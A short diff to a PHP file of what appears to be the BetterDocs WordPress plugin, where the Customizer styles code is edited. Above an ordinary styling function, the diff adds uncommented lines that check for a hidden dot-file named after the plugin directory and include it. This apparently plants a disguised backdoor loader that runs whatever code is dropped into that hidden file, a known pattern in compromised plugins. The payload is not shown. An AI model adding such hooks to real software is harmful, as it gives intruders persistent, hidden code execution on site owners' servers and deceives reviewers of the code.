@@ -8,6 +8,10 @@
 /**
  * This function adds some styles to the WordPress Customizer
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function betterdocs_customizer_styles() { ?>
 	<style type="text/css">
 		.customize-control-betterdocs-title .betterdocs-select,
